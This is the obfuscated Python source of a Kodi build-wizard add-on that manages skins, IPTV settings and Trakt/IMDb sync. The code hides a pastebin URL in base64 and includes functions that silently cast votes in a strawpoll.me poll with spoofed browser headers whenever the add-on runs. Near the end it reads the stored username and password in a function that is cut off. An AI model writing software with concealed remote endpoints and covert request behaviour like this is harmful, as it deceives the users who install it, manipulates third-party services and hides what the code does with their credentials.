# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
DP2 =xbmcgui .DialogProgressBG ()#line:67
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	O000O00OO00OO000O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OOOOOOOO0OO0OOOO0 =[];O00O000OOOO0OO0O0 =[]#line:267
	for O0OOO0O0O00000000 in sorted (O000O00OO00OO000O ,key =lambda OO0O0O00000O00000 :OO0O0O00000O00000 ):#line:268
		O000O000OOO0O0000 =os .path .split (O0OOO0O0O00000000 [:-1 ])[1 ]#line:269
		OOOO00O00OO0000OO =os .path .join (O0OOO0O0O00000000 ,'addon.xml')#line:270
		if os .path .exists (OOOO00O00OO0000OO ):#line:271
			OO0O0OO0OOOO0000O =open (OOOO00O00OO0000OO )#line:272
			OOO0OO00OO0OOOOOO =OO0O0OO0OOOO0000O .read ()#line:273
			OO0O0O0OOO000000O =parseDOM2 (OOO0OO00OO0OOOOOO ,'addon',ret ='id')#line:274
			OO000O0O00OO0O000 =O000O000OOO0O0000 if len (OO0O0O0OOO000000O )==0 else OO0O0O0OOO000000O [0 ]#line:275
			try :#line:276
				O000O0OOO00O0OOO0 =xbmcaddon .Addon (id =OO000O0O00OO0O000 )#line:277
				OOOOOOOO0OO0OOOO0 .append (O000O0OOO00O0OOO0 .getAddonInfo ('name'))#line:278
				O00O000OOOO0OO0O0 .append (OO000O0O00OO0O000 )#line:279
			except :#line:280
				pass #line:281
	OOOO0OOO000O0O0O0 =[];OOO0OOO0OOOOO000O =0 #line:282
	O0O0O00O000OO0O0O =["Current Skin -- %s"%currSkin ()]+OOOOOOOO0OO0OOOO0 #line:283
	OOO0OOO0OOOOO000O =DIALOG .select ("Select the Skin you want to swap with.",O0O0O00O000OO0O0O )#line:284
	if OOO0OOO0OOOOO000O ==-1 :return #line:285
	else :#line:286
		O00OO00O0O0O0O0OO =(OOO0OOO0OOOOO000O -1 )#line:287
		OOOO0OOO000O0O0O0 .append (O00OO00O0O0O0O0OO )#line:288
		O0O0O00O000OO0O0O [OOO0OOO0OOOOO000O ]="%s"%(OOOOOOOO0OO0OOOO0 [O00OO00O0O0O0O0OO ])#line:289
	if OOOO0OOO000O0O0O0 ==None :return #line:290
	for O00O0O0O0OO000OOO in OOOO0OOO000O0O0O0 :#line:291
		swapSkins (O00O000OOOO0OO0O0 [O00O0O0O0OO000OOO ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O0O00O0OOOO00OO00 ,title ="Error"):#line:296
	OO0OOOO00O0O00OOO ='lookandfeel.skin'#line:297
	O0OOO0OOOO00OOO0O =O0O00O0OOOO00OO00 #line:298
	O0O00O0OO0O00OOO0 =getOld (OO0OOOO00O0O00OOO )#line:299
	O00O0O00OOOOOO00O =OO0OOOO00O0O00OOO #line:300
	setNew (O00O0O00OOOOOO00O ,O0OOO0OOOO00OOO0O )#line:301
	O00O00O00O0O00O00 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O00O00O0O00O00 <100 :#line:303
		O00O00O00O0O00O00 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (O0O000O0OOOOOO000 ):#line:310
	try :#line:311
		O0O000O0OOOOOO000 ='"%s"'%O0O000O0OOOOOO000 #line:312
		O00O0OOOOO000O0O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O000O0OOOOOO000 )#line:313
		OOOOO0OO00OOO0O00 =xbmc .executeJSONRPC (O00O0OOOOO000O0O0 )#line:315
		OOOOO0OO00OOO0O00 =simplejson .loads (OOOOO0OO00OOO0O00 )#line:316
		if OOOOO0OO00OOO0O00 .has_key ('result'):#line:317
			if OOOOO0OO00OOO0O00 ['result'].has_key ('value'):#line:318
				return OOOOO0OO00OOO0O00 ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (O00O0O0O0O0OOO0OO ,OO000O0O00000O00O ):#line:325
	try :#line:326
		O00O0O0O0O0OOO0OO ='"%s"'%O00O0O0O0O0OOO0OO #line:327
		OO000O0O00000O00O ='"%s"'%OO000O0O00000O00O #line:328
		OOOO00OO0OO00O0OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O00O0O0O0O0OOO0OO ,OO000O0O00000O00O )#line:329
		O0OO0OO000O0OO0O0 =xbmc .executeJSONRPC (OOOO00OO0OO00O0OO )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			O0OO0O00OO0OO0OO0 =xbmcgui .DialogProgress ()#line:340
			O0OO0O00OO0OO0OO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			O0OO0O00OO0OO0OO0 .update (0 )#line:344
			for O0O00O00OOOOOO00O in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				O0OO0O00OO0OO0OO0 .update (int ((5 -O0O00O00OOOOOO00O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0O00O00OOOOOO00O ),'')#line:347
				if O0OO0O00OO0OO0OO0 .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			O0OO0O00OO0OO0OO0 =xbmcgui .DialogProgress ()#line:353
			O0OO0O00OO0OO0OO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			O0OO0O00OO0OO0OO0 .update (0 )#line:357
			for O0O00O00OOOOOO00O in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				O0OO0O00OO0OO0OO0 .update (int ((5 -O0O00O00OOOOOO00O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0O00O00OOOOOO00O ),'')#line:360
				if O0OO0O00OO0OO0OO0 .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O00000000O0OOO0OO ='18773068'#line:373
    O0O0000OOOO000O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00000000O0OOO0OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    O0O00O0OO0000OOO0 ='145273320'#line:387
    OO00O000O000000OO ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O0OOOO000OO0O00O0 =O0O00O0OO0000OOO0 #line:390
    else :#line:391
        O0OOOO000OO0O00O0 =OO00O000O000000OO #line:392
    OOOO0O000OO0OOO0O ={'options':O0OOOO000OO0O00O0 }#line:396
    O0O000000OOOOO0O0 =requests .post ('https://www.strawpoll.me/'+O00000000O0OOO0OO ,headers =O0O0000OOOO000O0O ,data =OOOO0O000OO0OOO0O )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        OO0O0OOOO0000000O ='18773068'#line:402
        OO00O0OOOO0O0O0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0O0OOOO0000000O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O00OO0O0000O00O0O ='145273320'#line:416
        OO0OO000O0O000OO0 ={'options':O00OO0O0000O00O0O }#line:422
        O0O0000OO0OO0OO00 =requests .post ('https://www.strawpoll.me/'+OO0O0OOOO0000000O ,headers =OO00O0OOOO0O0O0OO ,data =OO0OO000O0O000OO0 )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O0O0OO0OOOO000OO0 ='18773068'#line:429
        OO000OO0000O000O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OO0OOOO000OO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        OO000OO0000000OO0 ='145273321'#line:443
        O000OO0OO0OOOO000 ={'options':OO000OO0000000OO0 }#line:449
        OOOOO0O0OOO0OO0OO =requests .post ('https://www.strawpoll.me/'+O0O0OO0OOOO000OO0 ,headers =OO000OO0000O000O0 ,data =O000OO0OO0OOOO000 )#line:451
   except :pass #line:452
def testcommand ():#line:456
 OO000O0OO0OO0OO00 =os .path .dirname (os .path .realpath (__file__ ))#line:457
 O0O000OOOOOOO000O =os .path .join (OO000O0OO0OO0OO00 ,'changelog.txt')#line:458
 OO0O00OO0OOOO00O0 =open (O0O000OOOOOOO000O ,'r')#line:459
 OO0OOOOO00OOO00O0 =OO0O00OO0OOOO00O0 .read ()#line:460
 OO00OOOOOOO00O000 =OO0OOOOO00OOO00O0 #line:461
 notify .updateinfo (OO00OOOOOOO00O000 ,True )#line:462
def skin_homeselect ():#line:463
	try :#line:465
		OO000OO0O0O0OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:466
		OO0000000OOOOO0O0 =open (OO000OO0O0O0OO0OO ,'r')#line:468
		O0OO00O0000O0O00O =OO0000000OOOOO0O0 .read ()#line:469
		OO0000000OOOOO0O0 .close ()#line:470
		OOO0OOO0000OO0OO0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:471
		OO00OOOOOO000O0O0 =re .compile (OOO0OOO0000OO0OO0 ).findall (O0OO00O0000O0O00O )[0 ]#line:472
		OO0000000OOOOO0O0 =open (OO000OO0O0O0OO0OO ,'w')#line:473
		OO0000000OOOOO0O0 .write (O0OO00O0000O0O00O .replace ('<setting id="HomeS" type="string%s/setting>'%OO00OOOOOO000O0O0 ,'<setting id="HomeS" type="string"></setting>'))#line:474
		OO0000000OOOOO0O0 .close ()#line:475
	except :#line:476
		pass #line:477
def autotrakt ():#line:480
    OOOOO0O0O0O00O00O =(ADDON .getSetting ("auto_trk"))#line:481
    if OOOOO0O0O0O00O00O =='true':#line:482
       from resources .libs import trk_aut #line:483
def traktsync ():#line:485
     O0OOO00O00000OO00 =(ADDON .getSetting ("auto_trk"))#line:486
     if O0OOO00O00000OO00 =='true':#line:487
       from resources .libs import trk_aut #line:490
     else :#line:491
        ADDON .openSettings ()#line:492
def imdb_synck ():#line:494
   try :#line:495
     O0O0O00O0O00OOO0O =xbmcaddon .Addon ('plugin.video.exodusredux')#line:496
     O0000O0000O00000O =xbmcaddon .Addon ('plugin.video.gaia')#line:497
     OOO00OOOO0O0OOO00 =(ADDON .getSetting ("imdb_sync"))#line:498
     OOO00OOOO0O00O000 ="imdb.user"#line:499
     OO000O0O0O0O00OOO ="accounts.informants.imdb.user"#line:500
     O0O0O00O0O00OOO0O .setSetting (OOO00OOOO0O00O000 ,str (OOO00OOOO0O0OOO00 ))#line:501
     O0000O0000O00000O .setSetting ('accounts.informants.imdb.enabled','true')#line:502
     O0000O0000O00000O .setSetting (OO000O0O0O0O00OOO ,str (OOO00OOOO0O0OOO00 ))#line:503
   except :pass #line:504
def dis_or_enable_addon (OO0OO0OOOO00O0000 ,O000O0O00OO0OOO0O ,enable ="true"):#line:506
    import json #line:507
    OOO0O0OOO000O0000 ='"%s"'%OO0OO0OOOO00O0000 #line:508
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO0OOOO00O0000 )and enable =="true":#line:509
        logging .warning ('already Enabled')#line:510
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0OO0OOOO00O0000 )#line:511
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO0OOOO00O0000 )and enable =="false":#line:512
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0OO0OOOO00O0000 )#line:513
    else :#line:514
        OOOO0O0OO0OOOO0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO0O0OOO000O0000 ,enable )#line:515
        OO000OOO0O0O0OO00 =xbmc .executeJSONRPC (OOOO0O0OO0OOOO0O0 )#line:516
        OO000O00O0O000OOO =json .loads (OO000OOO0O0O0OO00 )#line:517
        if enable =="true":#line:518
            xbmc .log ("### Enabled %s, response = %s"%(OO0OO0OOOO00O0000 ,OO000O00O0O000OOO ))#line:519
        else :#line:520
            xbmc .log ("### Disabled %s, response = %s"%(OO0OO0OOOO00O0000 ,OO000O00O0O000OOO ))#line:521
    if O000O0O00OO0OOO0O =='auto':#line:522
     return True #line:523
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:524
def iptvset ():#line:527
  try :#line:528
    O0O0O0OO00O0O0O00 =(ADDON .getSetting ("iptv_on"))#line:529
    if O0O0O0OO00O0O0O00 =='true':#line:531
       if KODIV >=17 and KODIV <18 :#line:533
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:534
         OO0O0OO00O0000O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:535
         O0O00O0OOO000OO00 =(ADDON .getSetting ("iptvUrl"))#line:537
         OO0O0OO00O0000O00 .setSetting ('m3uUrl',O0O00O0OOO000OO00 )#line:538
         O00O00O0O00000000 =(ADDON .getSetting ("epg_Url"))#line:539
         OO0O0OO00O0000O00 .setSetting ('epgUrl',O00O00O0O00000000 )#line:540
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:543
         iptvsimpldownpc ()#line:544
         wiz .kodi17Fix ()#line:545
         xbmc .sleep (1000 )#line:546
         OO0O0OO00O0000O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:547
         O0O00O0OOO000OO00 =(ADDON .getSetting ("iptvUrl"))#line:548
         OO0O0OO00O0000O00 .setSetting ('m3uUrl',O0O00O0OOO000OO00 )#line:549
         O00O00O0O00000000 =(ADDON .getSetting ("epg_Url"))#line:550
         OO0O0OO00O0000O00 .setSetting ('epgUrl',O00O00O0O00000000 )#line:551
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:553
         iptvsimpldown ()#line:554
         wiz .kodi17Fix ()#line:555
         xbmc .sleep (1000 )#line:556
         OO0O0OO00O0000O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:557
         O0O00O0OOO000OO00 =(ADDON .getSetting ("iptvUrl"))#line:558
         OO0O0OO00O0000O00 .setSetting ('m3uUrl',O0O00O0OOO000OO00 )#line:559
         O00O00O0O00000000 =(ADDON .getSetting ("epg_Url"))#line:560
         OO0O0OO00O0000O00 .setSetting ('epgUrl',O00O00O0O00000000 )#line:561
  except :pass #line:562
def howsentlog ():#line:569
       try :#line:570
          import json #line:571
          OO00OOOO00OO0O000 =(ADDON .getSetting ("user"))#line:572
          OO0OO0O0O0OOO0O00 =(ADDON .getSetting ("pass"))#line:573
          O00O0000OOOO00000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:574
